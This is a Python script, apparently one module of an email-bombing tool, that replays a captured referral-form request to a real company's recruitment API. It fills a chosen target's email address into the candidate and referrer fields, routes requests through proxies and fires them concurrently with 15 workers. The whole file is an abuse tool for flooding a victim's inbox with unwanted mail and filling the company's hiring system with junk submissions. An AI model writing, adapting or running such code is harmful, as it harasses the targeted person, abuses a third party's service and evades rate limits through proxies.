from os.path import basename

import requests

from module import Spam

headers = {
    'Accept': '*/*',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Connection': 'keep-alive',
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryjwBKENDz5AiDTDcF',
    'Origin': 'https://see.proxiad.com',
    'Referer': 'https://see.proxiad.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'cross-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

s = '{"status":"Candidate added to job"}'


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = '------WebKitFormBoundaryjwBKENDz5AiDTDcF\r\nContent-Disposition: form-data; name="referrer_full_name"\r\n\r\ntest\r\n------WebKitFormBoundaryjwBKENDz5AiDTDcF\r\nContent-Disposition: form-data; name="referrer_email"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryjwBKENDz5AiDTDcF\r\nContent-Disposition: form-data; name="message"\r\n\r\nReferrer phone: 123123123\r\n------WebKitFormBoundaryjwBKENDz5AiDTDcF\r\nContent-Disposition: form-data; name="candidate_full_name"\r\n\r\ntest\r\n------WebKitFormBoundaryjwBKENDz5AiDTDcF\r\nContent-Disposition: form-data; name="candidate_email"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryjwBKENDz5AiDTDcF\r\nContent-Disposition: form-data; name="candidate_phone_number"\r\n\r\n123123123\r\n------WebKitFormBoundaryjwBKENDz5AiDTDcF\r\nContent-Disposition: form-data; name="candidate_description"\r\n\r\nRegular/Senior DevOps for medical AI project\r\n------WebKitFormBoundaryjwBKENDz5AiDTDcF\r\nContent-Disposition: form-data; name="candidate_resume"; filename="test_image.jpg"\r\nContent-Type: image/jpeg\r\n\r\nawdawdawd\r\n------WebKitFormBoundaryjwBKENDz5AiDTDcF--\r\n'
        data = data.replace('wezxasqw@gmail.com', target).replace('test', self.get_text())

        response = requests.post(
            'https://api.manatal.com/open/v3/career-page/proxiad-bulgaria/jobs/557682/refer/',
            headers=headers,
            data=data.encode(), proxies=self.get_proxies()
        )

        return response


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently(15)


if __name__ == '__main__':
    main()
